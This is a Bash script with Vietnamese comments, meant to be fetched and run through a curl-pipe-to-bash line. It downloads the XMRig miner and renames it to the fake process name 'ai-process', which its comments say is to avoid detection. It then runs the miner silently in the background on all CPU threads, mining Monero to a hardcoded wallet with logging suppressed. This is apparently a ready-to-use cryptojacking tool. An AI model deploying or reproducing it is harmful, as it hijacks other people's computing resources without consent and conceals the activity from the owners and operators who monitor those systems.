# curl -sL https://raw.githubusercontent.com/ChauDuongw/moungdungidx/refs/heads/main/codedao.sh | bash 
#!/bin/bash

# Tên giả cho tiến trình để tránh bị phát hiện dễ dàng
FAKE_NAME="ai-process"
# Địa chỉ pool đào (ví dụ: hashvault.pro)
POOL_URL="pool.hashvault.pro:443"
# Địa chỉ ví Monero (XMR) của bạn
WALLET="892Z4mTTy3UhGwqGafXpj27Qttop42wVR6yU8gv43i9H2cfHP6V8guPAWAf71cm32wU9aESsqe274ZnhW8219GMiSzLhTKK"
# Phiên bản XMrig mong muốn
XMRIG_VERSION="6.21.0"
XMRIG_TAR_GZ="xmrig-${XMRIG_VERSION}-linux-x64.tar.gz"
XMRIG_DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/${XMRIG_TAR_GZ}"

echo "[*] Bắt đầu thiết lập trình đào XMrig..."

# Tải và giải nén XMrig nếu chưa có
if [ ! -f "./xmrig" ]; then
    echo "[*] XMrig không tồn tại. Đang tải xuống XMrig v${XMRIG_VERSION}..."
    # Tải xuống XMrig
    curl -L -o "$XMRIG_TAR_GZ" "$XMRIG_DOWNLOAD_URL"
    if [ $? -ne 0 ]; then
        echo "[!] Lỗi khi tải xuống XMrig. Vui lòng kiểm tra URL hoặc kết nối mạng."
        exit 1
    fi

    # Giải nén
    tar -xf "$XMRIG_TAR_GZ"
    if [ $? -ne 0 ]; then
        echo "[!] Lỗi khi giải nén XMrig. Tệp có thể bị hỏng."
        rm -f "$XMRIG_TAR_GZ" # Xóa tệp lỗi
        exit 1
    fi

    # Di chuyển xmrig vào thư mục hiện tại và cấp quyền thực thi
    mv xmrig-*/xmrig .
    if [ $? -ne 0 ]; then
        echo "[!] Lỗi khi di chuyển tệp xmrig. Kiểm tra cấu trúc giải nén."
        rm -rf xmrig-* # Xóa các thư mục tạm
        exit 1
    fi
    chmod +x xmrig
    
    # Xóa các tệp tạm không cần thiết
    rm -f "$XMRIG_TAR_GZ"
    rm -rf xmrig-*
    echo "[*] Tải và cài đặt XMrig hoàn tất."
else
    echo "[*] XMrig đã tồn tại. Bỏ qua bước tải xuống."
fi

# Đổi tên giả và phân quyền cho tiến trình mới
cp xmrig "$FAKE_NAME"
chmod +x "$FAKE_NAME"
echo "[*] Đã tạo tiến trình giả mạo '$FAKE_NAME'."

# Xác định số luồng CPU tối đa để sử dụng
CORES_TO_USE=$(nproc --all) # Sử dụng --all để lấy tất cả các CPU có thể

echo "[*] Đang khởi chạy tiến trình '$FAKE_NAME' sử dụng $CORES_TO_USE luồng CPU..."

# Chạy miner với full CPU, tắt donate, log nhẹ để không làm chậm
# Sử dụng 'nohup' để đảm bảo tiến trình tiếp tục chạy ngay cả khi script bị đóng
# và '&' để chạy nó ở chế độ nền.
nohup ./"$FAKE_NAME" \
    -o "$POOL_URL" \
    -u "$WALLET" \
    -k \
    --tls \
    --donate-level 0 \
    --threads="$CORES_TO_USE" \
    --cpu \
    --randomx-1gb-pages \
    --randomx-no-numa \
    --log-file=/dev/null \
    > /dev/null 2>&1 &

if [ $? -eq 0 ]; then
    echo "[*] Tiến trình đào '$FAKE_NAME' đã được khởi chạy thành công trong chế độ nền."
    echo "[*] Để kiểm tra, bạn có thể chạy 'ps aux | grep $FAKE_NAME' hoặc 'top'."
else
    echo "[!] Có lỗi xảy ra khi cố gắng khởi chạy tiến trình đào."
fi

# Không cần vòng lặp 'while true' nếu đã dùng nohup và &.
# Vòng lặp đó chỉ cần thiết nếu bạn muốn script chính tiếp tục chạy
# để theo dõi hoặc thực hiện các tác vụ khác.
# Với nohup và &, tiến trình miner sẽ chạy độc lập.

# Script kết thúc ở đây, nhưng tiến trình đào vẫn tiếp tục chạy.
